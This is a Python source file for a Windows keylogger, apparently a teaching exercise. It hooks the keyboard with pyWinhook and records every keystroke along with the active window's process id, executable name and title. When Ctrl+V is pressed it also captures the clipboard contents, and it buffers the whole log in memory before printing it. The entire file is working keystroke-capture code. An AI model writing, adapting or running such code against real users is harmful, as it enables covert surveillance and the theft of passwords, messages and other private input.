from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 10
class Keylogger:
    def __init__(self):
        self.current_window = None
    def get_Currentprocess(self):
        window_handle = windll.user32.GetForegroundWindow() # CREATE A HANDLE FOR THE ACTIVE WINDOW!
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(window_handle, byref(pid))  # GET THE WINDOW'S PROCESS ID, STORE IT IN PID
        process_id = f'{pid.value}'
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)  #OPEN THE PROCESS USING MINIMUM REQ SECURITY ACCESS
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) # GET THE .EXE NAME, STORE IT IN EXECUTABLE
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(window_handle, byref(window_title), 512) #GRAB WINDOW'S TITLE TEXT, STORE IN WINDOW_TITLE
        try:
            self.current_window = window_title.value.decode()
        except UnicodeError as e:
            print(f'{e}: window name unknown')
        print('\n', process_id, executable.value.decode(), self.current_window)
        windll.kernel32.CloseHandle(window_handle) #CLOSE OUR HANDLES
        windll.kernel32.CloseHandle(h_process)

    def get_keystroke(self, event):
        if event.WindowName != self.current_window:
                self.get_Currentprocess()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    keylogger = Keylogger()
    hookmanager = pyHook.HookManager()
    hookmanager.KeyDown = keylogger.get_keystroke
    hookmanager.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log


print(run())
print('done')
